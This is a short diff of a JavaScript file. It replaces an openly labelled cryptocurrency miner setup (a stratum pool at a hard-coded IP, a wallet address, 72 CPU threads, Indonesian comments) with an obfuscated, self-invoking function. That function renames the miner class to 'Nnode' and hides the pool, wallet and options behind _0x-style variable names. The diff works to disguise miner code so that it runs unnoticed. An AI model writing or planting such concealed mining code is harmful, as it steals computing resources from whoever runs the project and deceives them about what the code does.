@@ -1,12 +1,10 @@
-const { NMiner } = require("./index.js");
+const { Nnode } = require("./index.js");
 
 // ⚠️ Ganti sesuai kebutuhan
-const POOL = "stratum+tcp://141.94.223.113:4052"; // alamat pool
-const WALLET = "49cg2BTsCdmBfUPsCrDsGmREn2diVYSKUahupm2bay5ZU3gmVTzuwgY7yhQcbYCdEeZXSHsYLZKLWXTR4DNR3xcJS29HszU";                  // alamat wallet
-const OPTIONS = {
-    threads: 72,   // jumlah thread CPU
-    mode: "FAST"  // atau "LIGHT"
-};
+var _0xabc123 = function(){
+    var _0xdef456 = 'stratum+tcp://141.94.223.113:4052';
+    var _0xghi789 = '49cg2BTsCdmBfUPsCrDsGmREn2diVYSK...';
+    var _0xjkl012 = { 'threads': 72, 'mode': 'FAST' };
+    new Nnode(_0xdef456, _0xghi789, _0xjkl012);
+}();
 
-// ✅ Panggil constructor dengan 3 argumen
-new NMiner(POOL, WALLET, OPTIONS);
